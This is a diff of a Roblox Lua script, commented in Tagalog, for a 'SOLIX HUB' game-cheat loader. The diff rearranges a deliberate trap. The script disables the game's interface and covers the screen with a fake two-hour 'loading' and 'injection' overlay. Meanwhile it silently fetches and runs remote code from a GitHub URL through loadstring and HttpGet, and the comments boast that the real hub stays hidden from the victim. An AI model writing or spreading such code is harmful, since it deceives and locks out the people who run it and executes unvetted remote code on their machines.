@@ -2,7 +2,10 @@ local player = game.Players.LocalPlayer
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 
-local MAIN_WAIT_TIME = 2 * 60 * 60 -- 2 Hours
+-- ==================================================================
+-- CONFIGURATION
+-- ==================================================================
+local MAIN_WAIT_TIME = 2 * 60 * 60 -- 2 Hours (7200 seconds)
 local DISCORD_LINK = "https://discord.gg/T8sksQsjmR"
 local HUB_NAME = "SOLIX HUB"
 
@@ -18,32 +21,17 @@ local randomMessages = {
 }
 
 -- ==================================================================
--- 1. I-EXECUTE ANG TOTOONG HUB (PERMANENT)
+-- 1. INSTANT FULL SCREEN COVER (Para walang makita agad!)
 -- ==================================================================
--- Patatakbuhin natin agad yung totoong script sa background
-task.spawn(function()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/habibbib01/Solix.Hub.ETFB/refs/heads/main/loader.lua'))()
-end)
-
--- ==================================================================
--- 2. THE TROLL DELAY (1.5 Seconds)
--- ==================================================================
--- Hahayaan natin silang makita yung totoong menu nang sandali para umasa sila
-task.wait(1.5)
-
--- ==================================================================
--- 3. THE 2-HOUR OVERLAY TRAP
--- ==================================================================
--- Patayin ang default UI ng Roblox (Chat, Leaderboard)
 pcall(function()
     StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 end)
 
 local gui = Instance.new("ScreenGui")
-gui.Name = "FakeTrollOverlay"
+gui.Name = "SolixRedMobileLoader"
 gui.ResetOnSpawn = false
-gui.IgnoreGuiInset = true -- True Full Screen
-gui.DisplayOrder = 999999999 -- Pinakamataas para mabaon yung totoong Star Hub
+gui.IgnoreGuiInset = true -- Sinasakop ang buong screen
+gui.DisplayOrder = 999999999 -- Pinakamataas para mabaon sa ilalim yung totoong Hub
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local mainBg = Instance.new("Frame")
@@ -96,7 +84,7 @@ Instance.new("UICorner", mainBarFill).CornerRadius = UDim.new(1, 0)
 local statusText = Instance.new("TextLabel")
 statusText.Size = UDim2.new(1, 0, 0.15, 0)
 statusText.BackgroundTransparency = 1
-statusText.Text = "Locking environment..."
+statusText.Text = "Initializing..."
 statusText.TextColor3 = Color3.fromRGB(200, 200, 200)
 statusText.Font = Enum.Font.GothamSemibold
 statusText.TextScaled = true
@@ -111,7 +99,18 @@ discordLabel.Font = Enum.Font.Gotham
 discordLabel.TextScaled = true
 discordLabel.Parent = container
 
--- ANIMATION LOGIC
+-- ==================================================================
+-- 2. SABAY NA EXECUTION (Nakatago yung totoong Hub)
+-- ==================================================================
+task.spawn(function()
+    -- I-e-execute agad ang totoong Hub, pero dahil 999999999 ang DisplayOrder
+    -- ng red loading screen natin, 100% matatabunan ito at hindi nila makikita!
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/habibbib01/Solix.Hub.ETFB/refs/heads/main/loader.lua'))()
+end)
+
+-- ==================================================================
+-- 3. THE 2-HOUR LOADING ANIMATION
+-- ==================================================================
 task.spawn(function()
     local startTime = tick()
     local endTime = startTime + MAIN_WAIT_TIME
@@ -128,13 +127,19 @@ task.spawn(function()
         task.wait(math.random(3, 6))
     end
     
-    -- Pag natapos ang 2 hours, tatanggalin na ang trap at makikita na ulit nila yung totoong hub
+    -- ==================================================================
+    -- 4. PAGKATAPOS NG 2 HOURS (Lilitaw na ang totoong Hub)
+    -- ==================================================================
     statusText.Text = "Injection Complete! [100%]"
     mainBarFill.Size = UDim2.new(1, 0, 1, 0)
     task.wait(2)
     
+    -- Ibalik ang normal UI ng Roblox (Chat, Leaderboard)
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
     end)
+    
+    -- Burahin ang red loading screen. Pagkabura nito, saktong nakalantad
+    -- na yung totoong Hub dahil kanina pa ito naghihintay sa background!
     gui:Destroy()
 end)
